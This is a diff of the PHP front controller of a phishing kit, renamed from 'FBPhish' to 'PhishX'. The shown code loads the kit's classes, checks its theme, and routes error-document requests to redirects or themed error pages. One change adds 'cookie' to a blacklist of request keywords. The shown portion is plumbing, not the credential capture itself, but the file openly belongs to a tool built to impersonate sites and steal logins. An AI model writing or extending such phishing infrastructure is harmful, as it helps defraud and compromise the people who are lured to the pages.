@@ -1,7 +1,7 @@
 <?php
 /*
-FBPhish
-Copyright (C) 2016  Jamie4224
+PhishX
+Copyright (c) 2016 Jamie4224
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -24,18 +24,18 @@ $apppath = __DIR__;
 
 // Require . . .
 require_once("$apppath/includes/config.inc.php");
-require_once("$apppath/includes/classes/fbphish.class.php");
+require_once("$apppath/includes/classes/phishx.class.php");
 require_once("$apppath/includes/classes/sql.class.php");
 require_once("$apppath/includes/classes/logger.class.php");
 require_once("$apppath/includes/functions/debug.func.php");
 require_once("$apppath/includes/functions/getip.func.php");
 
-$FBPhish = new FBPhish();
+$PhishX = new PhishX();
 $sql = new sql();
 $logger = new logger();
 
-$FBPhish->init();
-$FBPhish->themecheck();
+$PhishX->init();
+$PhishX->themecheck();
 
 // Log incoming uri's from errorDocuments
 if($_GET['dir'] == "error"){
@@ -55,7 +55,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -78,7 +78,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -101,7 +101,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -111,13 +111,12 @@ if($_GET['dir'] == "error"){
 			break;
 		case '404':
 			$containsBl = "false";
-			$blacklisted = array("ajax", "intern", "osd");
+			$blacklisted = array("ajax", "intern", "osd", "cookie");
 			foreach($blacklisted as $bl){
 				if(strpos($_SERVER['REQUEST_URI'], $bl) !== false) {
 				    $containsBl = "true";
 				}
 			}
-			echo $containsBl;
 			if($debug == "true"){
 				echo "<h1>404 - Not Found</h1>";
 				echo "<h3>The resource you are looking for has been deleted, moved or never existed</h3>";
@@ -134,7 +133,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -157,7 +156,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -180,7 +179,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -203,7 +202,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -226,7 +225,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -249,7 +248,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -272,7 +271,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -295,7 +294,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -318,7 +317,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -341,7 +340,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -364,7 +363,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -387,7 +386,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -410,7 +409,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -433,7 +432,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
@@ -457,7 +456,7 @@ if($_GET['dir'] == "error"){
 					header("Location: /index.php");
 					break;
 				case "show":
-					$errorPage = $FBPhish->loadPage("error");
+					$errorPage = $PhishX->loadPage("error");
 					echo $errorPage;
 					break;
 				default:
